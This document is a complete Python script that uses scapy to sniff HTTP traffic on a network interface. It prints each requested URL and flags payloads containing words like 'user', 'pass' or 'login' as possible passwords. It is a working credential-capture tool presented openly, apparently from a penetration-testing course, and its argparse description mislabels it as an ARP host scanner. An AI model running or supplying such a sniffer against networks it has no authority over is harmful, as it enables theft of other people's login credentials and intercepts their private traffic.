#!/usr/bin/env python

import scapy.all as scapy, time, argparse, psutil, socket
from scapy.layers import http
from sys import exit


def check_interface(interface):
    interface_addrs = psutil.net_if_addrs().get(interface) or []
    return socket.AF_INET in [snicaddr.family for snicaddr in interface_addrs]

def get_args():
    parser = argparse.ArgumentParser(description="Scan the network for online hosts using ARP requests")
    parser.add_argument("-i","--interface",metavar='', help="set the network device", required=True)
    return parser.parse_args() 

def sniff(interface):
    if check_interface(interface):
        print(f"{styles.HEADER_BOLD}[+] Sniffing has started, waiting for packets..... {styles.DEF}")
        scapy.sniff(iface=interface,store=False, prn=process)
    else:
        print(f"{styles.FAIL_BOLD}[-] Interface {interface} was not found. {styles.DEF}")
        exit(1)             

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode()
        keywords = ["user","pass","email","login","log_in","register","account","usr","pwd"]
        if any(word in load.lower() for word in keywords):
            return load  
    
def process(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f"\n{styles.HEADER}[+] URL: {styles.DEF} {get_url(packet).decode()}\n")
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n{styles.WARNING}[+] Possible Password Detected: {styles.DEF} {login_info}\n")              
           
class styles:
    HEADER = '\033[95m'
    HEADER_BOLD = '\033[1m\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    FAIL_BOLD = '\033[1m\033[91m'
    DEF = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.DEF = ''    

def main():
    sniff(get_args().interface)
    
if __name__ == '__main__':
    main()